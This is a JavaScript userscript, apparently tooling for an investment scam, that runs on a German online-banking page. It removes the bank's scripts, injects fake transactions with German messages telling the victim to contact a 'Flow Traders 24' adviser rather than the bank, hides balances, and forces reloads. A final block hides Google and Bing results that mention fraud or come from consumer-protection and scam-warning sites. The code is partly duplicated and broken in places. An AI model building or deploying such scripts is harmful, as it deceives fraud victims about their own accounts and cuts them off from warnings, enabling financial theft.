        // Trigger myUserScript on page load
        triggerMyUserScript();

         //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////


 //       // Specify your IBAN
 //   var desiredIBAN = 'DE26 7601 0085 0276 7158 57';

         //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////

     // Function to check if the IBAN matches
function ibanMatches(desiredIBAN) {
    var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
    if (ibanElement) {
        var ibanText = ibanElement.textContent.trim().toLowerCase().replace(/\s/g, '');
        var desiredIBANNormalized = desiredIBAN.toLowerCase().replace(/\s/g, '');
        return ibanText === desiredIBANNormalized;
    }
    return false;
}


        // Define your user script function
function myUserScript() {
 // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();

 //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////

 //     // Specify your IBAN
 //   var desiredIBAN = 'DE26 7601 0085 0276 7158 57';

 //    // Specify balance modification amount
 //   var balanceModificationAmount = 0.00; // Example: -1000 to decrease by 1000, +1000 to increase by 1000


// Specify the timeout (in milliseconds) before the script execution
    var scriptTimeout = 0; // Change this to your desired timeout in milliseconds (e.g., 5000 for 5 seconds)

/ /   // Define an array to store the transactions you want to insert
//    var transactionsToInsert = [
 //       {
//            recipient: 'JP Morgan Chase',
 //           transactionInfo: 'Treuhand:Freigabe nötig. Wenden Sie sich an Flow Traders 24 Berater, NICHT an die Bank, damit nicht gesperrt wird.',
 //           transactionType: ' SEPA Überweisung ',
 //           transactionDate: 'Vorgemekrt',
 //           transactionAmount: '49.000,00 EUR',
 //           preferredInsertionLogic: 'pinned_top',
 //           moveSteps: 0,
  //          moveDirection: 'up'
 //       },
 //       {
 //          recipient: 'JP Morgan Chase',
 //          transactionInfo: 'Geld für Steuern. Wenden Sie sich nur an Andreas Graf',
 //         transactionType: ' SEPA Überweisung ',
 //          transactionDate: '26.01.2024',
//           transactionAmount: '9.000,00 EUR',
//            preferredInsertionLogic: 'pinned_top',
////           moveSteps: 0,
 //           moveDirection: 'up'
 //       },
  //      {
   //         recipient: 'Recipient 3',
  //          transactionInfo: 'Transaction Info 3',
   //         transactionType: ' SEPA Überweisung ',
   //         transactionDate: '06.08.2023',
  //          transactionAmount: '3.000,00 EUR',
  //          preferredInsertionLogic: 'pinned_top',
  //          moveSteps: 0,
  //          moveDirection: 'down'
  //      }
        // Add more transactions as needed...
//    ];



     //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////


   // Function to check if the IBAN matches
function ibanMatches(desiredIBAN) {
    var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
    if (ibanElement) {
        var ibanText = ibanElement.textContent.trim().toLowerCase().replace(/\s/g, '');
        var desiredIBANNormalized = desiredIBAN.toLowerCase().replace(/\s/g, '');
        return ibanText === desiredIBANNormalized;
    }
    return false;
}


    // Delay script execution based on the specified timeout
    setTimeout(function() {
        // Check if the IBAN matches before proceeding
        if (ibanMatches(desiredIBAN)) {
            console.log('IBAN matches. Userscript started.');



  // Create a variable to track the total balance modification
var totalBalanceModification = 0;

// Loop through the transactions to insert
transactionsToInsert.forEach(function(transactionData) {
    // Insert the transaction
    insertTransaction(transactionData);
});



console.log('Userscript finished.');



console.log('Userscript finished.');



        console.log('Userscript finished.');
    } else {
      console.log('IBAN does not match. Userscript not executed.');
        }
    }, scriptTimeout);


  // Function to insert a transaction
function insertTransaction(data) {
    // Extract data from the transactionData object
    var desiredRecipient = data.recipient;
    var desiredTransactionInfo = data.transactionInfo;
    var desiredTransactionType = data.transactionType;
    var desiredTransactionDate = data.transactionDate;
    var desiredTransactionAmount = data.transactionAmount;
    var preferredInsertionLogic = data.preferredInsertionLogic; // Define preferredInsertionLogic
    var moveDirection = data.moveDirection; // Define moveDirection
    var moveSteps = data.moveSteps;  // Define move steps


  // Function to execute the main script logic once required elements are present
  function executeMainScript() {
    // Check if the IBAN matches before proceeding
    if (ibanMatches(desiredIBAN)) {
      console.log('IBAN matches. Userscript started.');

      // Create a variable to track the total balance modification
      var totalBalanceModification = 0;

      // Loop through the transactions to insert
      transactionsToInsert.forEach(function (transactionData) {
        // Insert the transaction
        insertTransaction(transactionData);
      });

      // Modify the main balance once after all transactions are inserted
      modifyMainBalance(balanceModificationAmount);

      console.log('Userscript finished.');
    } else {
      console.log('IBAN does not match. Userscript not executed.');
    }
  }

  // Function to periodically check for the presence of required elements
  function waitForElements() {
    // Replace the following line with actual code to check if the required elements exist on the page
    // Example: Check if elements with certain selectors are present on the page
    var requiredElementsExist = document.querySelector('.your-selector') !== null;

    if (requiredElementsExist) {
      // Elements found, execute the main script logic
      executeMainScript();
    } else {
      // Elements not found, continue polling
      setTimeout(waitForElements, 1000); // Poll every 1 second
    }
  }

  // Delay script execution based on the specified timeout
  setTimeout(waitForElements, scriptTimeout);

 // Replace the comma with a period and parse the amount as a floating-point number
    var parsedAmount = parseFloat(desiredTransactionAmount.replace(/\./g, '').replace(',', '.'));


    // Create the transaction HTML structure
    var transactionHTML = `
    <div _ngcontent-vyi-c225="" class="${preferredInsertionLogic === "pinned_top" ? "container" : ""}">

    <cirrus-transaction-row _ngcontent-vyi-c223="" data-test="transactionsRow" _nghost-vyi-c222="">
            <db-list-row _ngcontent-vyi-c222="" data-test="bookedTransaction" class="pr-4 align-items-center clickable" tabindex="0">
                <db-list-row-prefix _ngcontent-vyi-c222="">
                    <db-avatar _ngcontent-vyi-c222="" data-test="icon">
                        <div class="db-avatar db-avatar-type--icon db-avatar-size--md">
                            <db-icon aria-hidden="true" class="db-icon--transfer">
                                <span translate="no" class="sr-only">transfer</span>
                                <svg focusable="false" class="db-icon__icon">
                                    <use xlink:href="#transfer"></use>
                                </svg>
                            </db-icon>
                        </div>
                    </db-avatar>
                </db-list-row-prefix>
                <db-list-row-content _ngcontent-vyi-c222="" class="col-md-4 text-truncate-md pl-0">
                    <div _ngcontent-vyi-c222="" data-test="counterPartyNameOrTransactionTypeLabel" class="db-text-4 db-text-bold color-text-primary">
                        <span _ngcontent-vyi-c222="">${desiredRecipient}</span>
                    </div>
                    <div _ngcontent-vyi-c222="" class="db-text-5 color-text-secondary text-truncate-md">${desiredTransactionInfo}</div>
                </db-list-row-content>
                <db-list-row-content _ngcontent-vyi-c222="" data-test="transactionTypeLabel" class="text-truncate db-text-5 d-none d-md-block text-right text-md-left ml-5 pl-3">
                    <div _ngcontent-vyi-c222="" class="text-truncate color-text-primary pt-md-1">${desiredTransactionType}</div>
                    <div _ngcontent-vyi-c222="" data-test="transactionRowDate" class="text-truncate color-text-secondary pt-md-1">${desiredTransactionDate}</div>
                </db-list-row-content>
                <db-list-row-content _ngcontent-vyi-c222="" data-test="amount" class="d-none d-md-block">
                    <div _ngcontent-vyi-c222="" data-test="amount" class="text-truncate db-text-4 text-right color-text-primary">
                        <cirrus-decorated-amount _ngcontent-vyi-c222="" _nghost-vyi-c166="">
                            <span _ngcontent-vyi-c166="" class="color-text-primary directional with-color text-nowrap">
                                <span _ngcontent-vyi-c166="" class="${parsedAmount >= 0 ? 'positive db-text-bold' : 'negative db-text-bold'}">${desiredTransactionAmount} <span _ngcontent-vyi-c166="" data-test="currencyCode" class="db-text-5 db-text-bold">EUR</span></span>
                            </span>
                        </cirrus-decorated-amount>
                    </div>
                    <div _ngcontent-vyi-c222="" data-test="transactionRowDate" class="d-md-none text-truncate date db-text-5 text-right text-md-left order-md-4 pt-md-1 sf-hidden">${desiredTransactionDate}</div>
                </db-list-row-content>
                <db-list-row-menu _ngcontent-vyi-c222="" class="d-none d-md-flex">
                    <db-list-row-suffix>
                        <db-menu design="tertiary">
                            <db-button type="button" class="db-menu__button">
                                <button class="db-button db-button--icon-only db-button--tertiary db-button--md" type="button" tabindex="0" aria-disabled="false">
                                    <span class="db-button__content">
                                        <span>
                                            <db-icon size="md" class="icon db-icon--more" aria-hidden="true">
                                                <span translate="no" class="sr-only">more</span>
                                                <svg focusable="false" class="db-icon__icon db-icon__icon--md">
                                                    <use xlink:href="#more"></use>
                                                </svg>
                                            </db-icon>
                                        </span>
                                    </span>
                                </button>
                            </db-button>
                        </db-menu>
                    </db-list-row-suffix>
                </db-list-row-menu>
            </db-list-row>
            <div _ngcontent-vyi-c222="" data-test="amount" class="db-list-row d-md-none pr-4 pb-3 amount-row sf-hidden"></div>
                                    </cirrus-transaction-row>
         </div>
    `;

    // Find the transaction view element
    var transactionViewElement = document.querySelector('cirrus-transactions-view');

    if (transactionViewElement) {
        console.log('Transaction view element found:', transactionViewElement);

        // ... (existing code to create the newTransactionRow and set text content) done

       // Create a new transaction row element
            var newTransactionRow = document.createElement('cirrus-transaction-row');
            newTransactionRow.innerHTML = transactionHTML;


// Set the text content for the specific elements
var recipientElement = newTransactionRow.querySelector('.db-text-4');
var transactionInfoElement = newTransactionRow.querySelector('.color-text-secondary.text-truncate-md');
var transactionTypeElement = newTransactionRow.querySelector('.text-truncate.color-text-primary.pt-md-1');
var transactionDateElement = newTransactionRow.querySelector('.text-truncate.color-text-secondary.pt-md-1');
var transactionAmountElement = parsedAmount < 0 ? newTransactionRow.querySelector('.negative.db-text-bold') : newTransactionRow.querySelector('.positive.db-text-bold');


    transactionAmountElement = newTransactionRow.querySelector('.positive.db-text-bold');


if (recipientElement) {
    recipientElement.textContent = desiredRecipient;
    console.log('Recipient text set.');
}

if (transactionAmountElement) {
    transactionAmountElement.textContent = desiredTransactionAmount;
    // Set the text color to green (#008600) for positive amounts
    if (parsedAmount >= 0) {
        transactionAmountElement.style.color = '#008600';
    }
    console.log('Transaction amount text set.');
}

if (transactionTypeElement) {
    transactionTypeElement.textContent = desiredTransactionType;
    console.log('Transaction type text set.');
}

if (transactionDateElement) {
    transactionDateElement.textContent = desiredTransactionDate;
    console.log('Transaction date text set.');
}

if (transactionAmountElement) {
    transactionAmountElement.textContent = desiredTransactionAmount;
    console.log('Transaction amount text set.');
}


        if (data.preferredInsertionLogic === 'corresponding_date') {
                // Insert using the logic from the first script (corresponding date)
                var transactionsGroupElement = document.querySelector('cirrus-transactions-group');
                if (transactionsGroupElement) {
                var desiredDate = new Date(desiredTransactionDate);
                var transactionsWithSameDate = Array.from(transactionsGroupElement.querySelectorAll('cirrus-transaction-row')).filter(function(transaction) {
                    var transactionDateElement = transaction.querySelector('.text-truncate.color-text-secondary.pt-md-1');
                    if (transactionDateElement) {
                        var transactionDate = new Date(transactionDateElement.textContent.trim());
                        return transactionDate.toISOString().split('T')[0] === desiredDate.toISOString().split('T')[0];
                    }
                    return false;
                });

                // Adjust the index to move the transaction
                var currentIndex = transactionsWithSameDate.indexOf(newTransactionRow);
                var newIndex = 0;
                if (moveDirection === "up") {
                    newIndex = Math.max(0, currentIndex - moveSteps);
                } else if (moveDirection === "down") {
                    newIndex = Math.min(transactionsWithSameDate.length, currentIndex + moveSteps);
                }

                if (transactionsWithSameDate.length > 0) {
                    // Insert the transaction at the adjusted index
                    transactionsWithSameDate[newIndex].insertAdjacentElement('afterend', newTransactionRow);
                    console.log('Transaction inserted after transactions with the same date.');
                 } else {
                    var closestTransaction = null;
                    var closestDateDiff = Infinity;

                    Array.from(transactionsGroupElement.querySelectorAll('cirrus-transaction-row')).forEach(function(transaction) {
                        var transactionDateElement = transaction.querySelector('.text-truncate.color-text-secondary.pt-md-1');
                        if (transactionDateElement) {
                            var transactionDate = new Date(transactionDateElement.textContent.trim());
                            var dateDiff = Math.abs(desiredDate - transactionDate);
                            if (dateDiff < closestDateDiff) {
                                closestDateDiff = dateDiff;
                                closestTransaction = transaction;
                            }
                        }
                    });

                    if (closestTransaction) {
                        // Insert the transaction next to the closest transaction
                        closestTransaction.insertAdjacentElement('afterend', newTransactionRow);
                        console.log('Transaction inserted next to the closest transaction.');
                        newTransactionRow.removeAttribute("class"); // Remove the "container" class
                    } else {
                        // Insert the transaction as the first transaction in the group
                        transactionsGroupElement.appendChild(newTransactionRow);
                        console.log('Transaction inserted as the first transaction in the group.');
                        newTransactionRow.removeAttribute("class"); // Remove the "container" class
                    }
                }
            } else {
                console.log('Transactions group element not found.');
            }
        } else if (preferredInsertionLogic === "pinned_top") {
            // Insert using the logic from the second script (pinned at the top)
            transactionViewElement.insertBefore(newTransactionRow, transactionViewElement.firstChild);

            // If you want to move the transaction up or down in this case, you can adjust the insertion position accordingly
                if (data.moveDirection === 'up') {
                    transactionViewElement.insertBefore(newTransactionRow, transactionViewElement.children[data.moveSteps]);
                } else if (data.moveDirection === 'down') {
                    transactionViewElement.insertBefore(newTransactionRow, transactionViewElement.children[data.moveSteps + 1]);
                }

            console.log('Transaction inserted.');
        } else {
            console.log('Invalid preferred insertion logic:', preferredInsertionLogic);
        }
    } else {
        console.log('Transaction view element not found.');
    }

    // ... (rest of the script)



         console.log('Userscript finished.');

    }
}

})();


///////////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///
//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END///////////THE END////////////////THE END/////THE END//





//REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM........
////////////REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM........


(function removebal() {
    'use strict';

     // Function to create the spinner and background
    function createSpinner() {
        var background = document.createElement('div');
        background.className = 'app-loading-background';

        var spinner = document.createElement('div');
        spinner.className = 'app-loading-pulsing';

        // Apply styles to the background and spinner
        background.style.position = 'fixed';
        background.style.top = '0';
        background.style.left = '0';
        background.style.width = '100%';
        background.style.height = '100%';
        background.style.backgroundColor = 'white';
        background.style.zIndex = '9999';

        spinner.style.position = 'absolute';
        spinner.style.top = '50%';
        spinner.style.left = '50%';
        spinner.style.transform = 'translate(-50%,-50%)';
        spinner.style.width = '120px';
        spinner.style.height = '120px';
        spinner.style.display = 'block';
        spinner.style.backgroundImage = 'url(pb-logo-splash.e83ae1f69ca2f23d.svg)';
        spinner.style.backgroundSize = '100%';
        spinner.style.animationName = 'pulse';
        spinner.style.animationTimingFunction = 'ease-in-out';
        spinner.style.animationIterationCount = 'infinite';
        spinner.style.animationDuration = '10s';
        spinner.style.animationFillMode = 'both';

        // Append the background and spinner to the document body
        document.body.appendChild(background);
        background.appendChild(spinner);

        return background;
    }


     // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Remove scripts from the document
    removeScripts();


// Function to remove elements with specific classes
function removeElements() {
    const parentElements = document.querySelectorAll('.db-banking-custom-select__combo-container');
    parentElements.forEach(function(parent) {
        const elementsToRemove = parent.querySelectorAll('.positive.db-text-bold, .db-text-bold, .negative.db-text-bold, .color-text-primary.balance.with-color.text-nowrap, .d-flex.align-items-center.mt-1.mt-sm-0');
        elementsToRemove.forEach(function(element) {
            element.remove();
        });
    });

           // Remove elements with the class "ml-2 ml-md-4" and its children except within the specified area
        const mlElements = document.querySelectorAll('.ml-2.ml-md-4');
        mlElements.forEach(function(mlElement) {
            if (!isElementInExcludedArea(mlElement, 'db-custom-select__combo-container__header-box-wrapper.no-label')) {
                mlElement.remove();
            }
        });

          // Remove elements with class "page-header__back-link__text d-flex align-items-center db-text-bold"
        const backLinkElements = document.querySelectorAll('.page-header__back-link__text.d-flex.align-items-center.db-text-bold');
        backLinkElements.forEach(function(backLinkElement) {
            backLinkElement.remove();
        });

    }

     // Function to check if an element is within the excluded area
    function isElementInExcludedArea(element, excludedAreaClass) {
        const excludedArea = element.closest('.' + excludedAreaClass);
        return excludedArea !== null;
    }



  // Function to add a spinner and remove it after a specified duration
    function addSpinnerWithDuration(duration) {
        var spinner = createSpinner();
        setTimeout(function() {
            removeSpinner(spinner);
        }, duration);
    }

    // Function to remove the spinner element
    function removeSpinner(spinner) {
        spinner.remove();
    }

    // Function to handle clicks on elements with the class "btn-toolbar" or its children
    function handleButtonClick(event) {
        if (event.target.closest('.btn-toolbar')) {
            addSpinnerWithDuration(10000); // Adjust the duration as needed (e.g., 6 seconds)
        }
    }

    // Create a MutationObserver to constantly monitor the webpage
    const mobserver = new MutationObserver(function(mutationsList, mobserver) {
        // Check for added nodes (newly appeared elements)
        mutationsList.forEach(function(mutation) {
            if (mutation.addedNodes.length > 0) {
                // Elements were added to the DOM, so remove them
                removeElements();
            }
        });
    });

    // Start observing changes to the body element
    const body = document.querySelector('body');
    if (body) {
        mobserver.observe(body, { childList: true, subtree: true });
    }

    // Initially, remove any matching elements that are already present
    removeElements();

    // Add a click event listener to the document body using event delegation
    document.body.addEventListener('click', handleButtonClick);

})();




///////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END//////
//REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM.......REM ELEM..........
////////////REM ELEM...........REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM..................REM ELEM........REM ELEM.
//THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END/////////////////THE END//////



/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................




    (function finanzübersichtReloadOnClick() {
    'use strict';

    console.log("Script started...");

    var isReloadAllowed = false;

    // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Function to handle the one-time reload
    function performReload() {
        if (isReloadAllowed) {
            console.log("Reloading the page...");
            window.localStorage.setItem('refresh', "1");
            window.location.reload();
        }
    }

    // Add click event listeners to the specified elements and its parent
    var navMenuButton = document.querySelector('.nav-menu__item__button.h-100.btn-active');
    var navMenuItem = navMenuButton ? navMenuButton.parentElement : null;

    function addClickListeners() {
        if (navMenuButton) {
            navMenuButton.addEventListener('click', function() {
                if (isReloadAllowed) {
                    performReload();
                }
                isReloadAllowed = true;
            });
        }

        if (navMenuItem) {
            navMenuItem.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                if (isReloadAllowed) {
                    performReload();
                }
                isReloadAllowed = true;
            });
        }

        // Add click event listeners to the specified additional areas
        var headerNavLogo = document.querySelector('.header__nav__logo.align-self-center');
        var dLgInlineBlock = document.querySelector('.d-lg-inline-block.m-0.active');

        if (headerNavLogo) {
            headerNavLogo.addEventListener('click', function() {
                isReloadAllowed = true;
                performReload();
            });
        }

        if (dLgInlineBlock) {
            dLgInlineBlock.addEventListener('click', function() {
                isReloadAllowed = true;
                performReload();
            });
        }
    }

    // Monitor the document for changes and add click listeners
    var observer = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }

        if (!navMenuButton || !navMenuItem) {
            navMenuButton = document.querySelector('.nav-menu__item__button.h-100.btn-active');
            navMenuItem = navMenuButton ? navMenuButton.parentElement : null;
            addClickListeners();
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Add initial click listeners
    addClickListeners();

    console.log("Script initialized.");
})();

////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD................./////////////
/////////////////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................
////FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................FIN RELOAD.................////////////
///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////







})();

    }

///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////
///////////////////THE END////////////////////THE END/////////////THE END/////////////////////////////THE END///////////////////////THE END/////////////THE END///////////////////////THE END////////////////THE END////////////////////THE END//////////////////////////////////

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }

